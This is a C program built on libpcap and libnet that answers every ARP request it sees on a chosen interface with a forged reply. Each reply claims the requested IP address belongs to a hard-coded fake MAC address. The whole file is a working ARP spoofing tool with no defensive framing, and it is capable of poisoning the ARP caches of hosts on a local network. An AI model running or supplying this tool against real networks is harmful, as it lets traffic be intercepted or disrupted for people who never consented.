#include <pcap.h>
#include <libnet.h>
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <arpa/inet.h>
#include <netinet/if_ether.h>

/* ===============================
 * GLOBALS
 * =============================== */
pcap_t *pcap_handle;
libnet_t *libnet_handle;

/* MAC we are pretending to be */
uint8_t my_mac[6] = { 0x02, 0x11, 0x22, 0x33, 0x44, 0x55 };

/* ===============================
 * Ctrl+C handler
 * =============================== */
void handle_sigint(int sig)
{
    (void)sig;
    pcap_breakloop(pcap_handle);
}

/* ===============================
 * Send ARP reply
 * =============================== */
void send_arp_reply(
    uint8_t *target_mac,
    uint32_t spoofed_ip,
    uint32_t target_ip
)
{
    libnet_clear_packet(libnet_handle);

    libnet_ptag_t arp_tag, eth_tag;

    arp_tag = libnet_build_arp(
        ARPHRD_ETHER,
        ETHERTYPE_IP,
        6,
        4,
        ARPOP_REPLY,
        my_mac,
        (uint8_t *)&spoofed_ip,
        target_mac,
        (uint8_t *)&target_ip,
        NULL,
        0,
        libnet_handle,
        0
    );

    if (arp_tag == -1) {
        fprintf(stderr, "[-] libnet_build_arp failed: %s\n",
                libnet_geterror(libnet_handle));
        return;
    }

    eth_tag = libnet_build_ethernet(
        target_mac,
        my_mac,
        ETHERTYPE_ARP,
        NULL,
        0,
        libnet_handle,
        0
    );

    if (eth_tag == -1) {
        fprintf(stderr, "[-] libnet_build_ethernet failed: %s\n",
                libnet_geterror(libnet_handle));
        return;
    }

    if (libnet_write(libnet_handle) == -1) {
        fprintf(stderr, "[-] libnet_write failed: %s\n",
                libnet_geterror(libnet_handle));
        return;
    }

    /* Log response */
    struct in_addr sip, tip;
    sip.s_addr = spoofed_ip;
    tip.s_addr = target_ip;

    printf("[RESP] %s is-at %02x:%02x:%02x:%02x:%02x:%02x → %s\n",
           inet_ntoa(sip),
           my_mac[0], my_mac[1], my_mac[2],
           my_mac[3], my_mac[4], my_mac[5],
           inet_ntoa(tip));
}

/* ===============================
 * ARP packet handler
 * =============================== */
void arp_handler(
    u_char *user,
    const struct pcap_pkthdr *h,
    const u_char *packet
)
{
    (void)user;

    if (h->caplen < sizeof(struct ether_header) + sizeof(struct ether_arp))
        return;

    struct ether_header *eth =
        (struct ether_header *)packet;

    if (ntohs(eth->ether_type) != ETHERTYPE_ARP)
        return;

    struct ether_arp *arp =
        (struct ether_arp *)(packet + sizeof(struct ether_header));

    if (ntohs(arp->ea_hdr.ar_op) != ARPOP_REQUEST)
        return;

    if (memcmp(arp->arp_sha, my_mac, 6) == 0)
        return;

    uint32_t sender_ip, target_ip;
    memcpy(&sender_ip, arp->arp_spa, 4);
    memcpy(&target_ip, arp->arp_tpa, 4);

    struct in_addr sip, tip;
    sip.s_addr = sender_ip;
    tip.s_addr = target_ip;

    printf("[REQ ] %s (%02x:%02x:%02x:%02x:%02x:%02x) asks for %s\n",
           inet_ntoa(sip),
           arp->arp_sha[0], arp->arp_sha[1], arp->arp_sha[2],
           arp->arp_sha[3], arp->arp_sha[4], arp->arp_sha[5],
           inet_ntoa(tip));

    send_arp_reply(arp->arp_sha, target_ip, sender_ip);
}

/* ===============================
 * MAIN
 * =============================== */
int main(int argc, char *argv[])
{
    char errbuf[PCAP_ERRBUF_SIZE];
    struct bpf_program fp;

    if (argc != 2) {
        fprintf(stderr, "Usage: %s <interface>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    libnet_handle = libnet_init(LIBNET_LINK, argv[1], errbuf);
    if (!libnet_handle) {
        fprintf(stderr, "libnet_init failed: %s\n", errbuf);
        exit(EXIT_FAILURE);
    }

    pcap_handle = pcap_open_live(argv[1], BUFSIZ, 1, 1000, errbuf);
    if (!pcap_handle) {
        fprintf(stderr, "pcap_open_live failed: %s\n", errbuf);
        exit(EXIT_FAILURE);
    }

    if (pcap_compile(pcap_handle, &fp, "arp", 0, PCAP_NETMASK_UNKNOWN) == -1 ||
        pcap_setfilter(pcap_handle, &fp) == -1) {
        fprintf(stderr, "pcap filter error\n");
        exit(EXIT_FAILURE);
    }

    signal(SIGINT, handle_sigint);

    printf("[*] Listening for all ARP requests on %s\n", argv[1]);
    printf("[*] Press Ctrl+C to stop\n\n");

    pcap_loop(pcap_handle, -1, arp_handler, NULL);

    printf("\n[*] Stopping...\n");

    pcap_freecode(&fp);
    pcap_close(pcap_handle);
    libnet_destroy(libnet_handle);
    return 0;
}
